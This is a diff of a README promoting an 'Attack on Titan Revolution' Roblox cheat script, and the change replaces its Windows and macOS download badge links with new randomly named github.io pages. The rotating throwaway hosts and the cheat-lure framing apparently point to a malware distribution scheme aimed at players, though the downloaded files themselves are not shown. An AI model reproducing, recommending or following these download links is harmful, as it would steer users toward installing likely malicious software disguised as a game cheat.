@@ -4,7 +4,7 @@
 ![Downloads](https://img.shields.io/badge/Downloads-150K+-blueviolet?style=for-the-badge)
 ![Status](https://img.shields.io/badge/Status-Working%202026-blueviolet?style=for-the-badge)
 
-[![Download Attack on Titan Revolution Script](https://img.shields.io/badge/Download%20Attack%20on%20Titan%20Revolution%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://uvkayskoqsgd.github.io/windows-files/)
+[![Download Attack on Titan Revolution Script](https://img.shields.io/badge/Download%20Attack%20on%20Titan%20Revolution%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://izaalowypioz.github.io/win-runner/)
 
 ---
 
@@ -47,9 +47,9 @@ The most reliable **Attack on Titan Revolution Script** for Roblox — God Mode,
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://uvkayskoqsgd.github.io/windows-files/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://izaalowypioz.github.io/win-runner/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://jaifcflcufqn.github.io/mac-install/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WoodSniperAtrium.github.io/macos-setup/)
 
 </div>
 
